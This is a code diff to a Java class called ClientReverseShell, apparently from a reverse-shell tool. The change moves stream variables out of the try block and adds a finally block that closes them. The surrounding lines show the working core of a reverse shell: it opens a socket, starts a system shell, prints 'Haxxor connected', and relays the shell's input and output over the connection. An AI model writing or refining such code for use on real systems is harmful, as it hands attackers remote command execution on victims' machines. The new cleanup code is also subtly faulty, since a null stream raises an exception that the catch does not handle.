@@ -8,6 +8,7 @@ import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.net.SocketTimeoutException;
+import java.util.Objects;
 
 @NoArgsConstructor
 public class ClientReverseShell {
@@ -74,6 +75,11 @@ public class ClientReverseShell {
     private void connect() {
 
         detectOperatingSystem();
+        OutputStream remoteStdin = null;
+        InputStream remoteStdout = null;
+        InputStream remoteStderr = null;
+        InputStream clientSocketInput = null;
+        OutputStream clientSocketOutput = null;
 
         try {
             Socket clientSocket = new Socket();
@@ -84,12 +90,12 @@ public class ClientReverseShell {
                     .redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
             System.out.println("Haxxor connected “ψ (｀∇´) ψ ... ◥(ฅº￦ºฅ)◤ ...\n");
 
-            OutputStream remoteStdin = remoteShell.getOutputStream();
-            InputStream remoteStdout = remoteShell.getInputStream();
-            InputStream remoteStderr = remoteShell.getErrorStream();
+            remoteStdin = remoteShell.getOutputStream();
+            remoteStdout = remoteShell.getInputStream();
+            remoteStderr = remoteShell.getErrorStream();
+            clientSocketInput = clientSocket.getInputStream();
+            clientSocketOutput = clientSocket.getOutputStream();
 
-            InputStream clientSocketInput = clientSocket.getInputStream();
-            OutputStream clientSocketOutput = clientSocket.getOutputStream();
             do {
                 if (!remoteShell.isAlive()) {
                     System.out.println("Remote shell has been terminated\n\n");
@@ -106,6 +112,15 @@ public class ClientReverseShell {
             System.out.println("EXIT");
         } catch (IOException e) {
             System.out.println("ERROR: " + e.getMessage());
+        } finally {
+            try {
+                Objects.requireNonNull(remoteStdin).close();
+                Objects.requireNonNull(remoteStdout).close();
+                Objects.requireNonNull(remoteStderr).close();
+                Objects.requireNonNull(clientSocketInput).close();
+                Objects.requireNonNull(clientSocketOutput).close();
+            } catch (IOException ignored) {
+            }
         }
     }
 
